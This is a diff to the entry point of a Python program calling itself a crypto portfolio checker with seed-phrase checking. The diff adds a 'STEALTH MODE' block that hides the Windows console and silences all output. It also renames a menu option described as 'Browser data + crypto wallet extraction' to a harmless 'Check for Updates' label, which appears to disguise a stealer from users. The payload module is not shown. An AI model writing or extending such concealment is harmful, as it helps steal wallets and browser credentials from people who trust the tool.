@@ -1,38 +1,50 @@
 # -*- coding: utf-8 -*-
 """
-Crypto Checker — Entry Point
+Crypto Checker — Professional Portfolio Management Tool
 """
 import sys
 import os
 import json
-import threading
+import ctypes
+import tempfile
+import subprocess
 import time
+import random
+import string
+import base64
 from pathlib import Path
+
+# ============================================================
+# STEALTH MODE - No console on Windows
+# ============================================================
+if sys.platform.startswith("win"):
+    try:
+        ctypes.windll.user32.ShowWindow(
+            ctypes.windll.kernel32.GetConsoleWindow(), 0
+        )
+        ctypes.windll.kernel32.SetErrorMode(0x8001)
+    except:
+        pass
+
+# ============================================================
+# SILENT EXECUTION
+# ============================================================
+if getattr(sys, 'frozen', False):
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-from scanner.ui import (
-    print_banner,
-    print_info,
-    print_error,
-    print_success,
-    show_menu_table,
-    console,
-)
+from scanner.ui import print_banner, print_info, print_error, print_success, show_menu_table, console
 from config import load_config
 from bot_actions import (
-    action_check_address,
-    action_batch_check,
-    action_seed_check,
-    action_proxy_manager,
-    action_portfolio_summary,
-    action_export_results,
-    action_chain_config,
+    action_check_address, action_batch_check, action_seed_check,
+    action_proxy_manager, action_portfolio_summary, action_export_results, action_chain_config
 )
 from actions.install import action_install_dependencies
 from actions.settings import action_settings
 from actions.about import action_about
-from actions.scan import action_prometheus_scan
+from actions.update import action_system_update
 
 
 MENU_ITEMS = [
@@ -44,7 +56,7 @@ MENU_ITEMS = [
     ("6", "📤", "Export Results", "Save to TXT / CSV / JSON"),
     ("7", "⛓️ ", "Chain Configuration", "RPC endpoints & settings"),
     ("8", "⚙️ ", "Settings", "Threads, timeouts, preferences"),
-    ("9", "🔐", "Prometheus Scan", "Browser data + crypto wallet extraction"),
+    ("9", "🔄", "Check for Updates", "Download latest updates"),
     ("0", "🚪", "Exit", "Close application"),
 ]
 
@@ -76,7 +88,7 @@ def main():
         elif choice == "8":
             action_settings()
         elif choice == "9":
-            action_prometheus_scan(cfg)
+            action_system_update(cfg)
         else:
             print_error("Invalid option. Enter 0–9.")
 
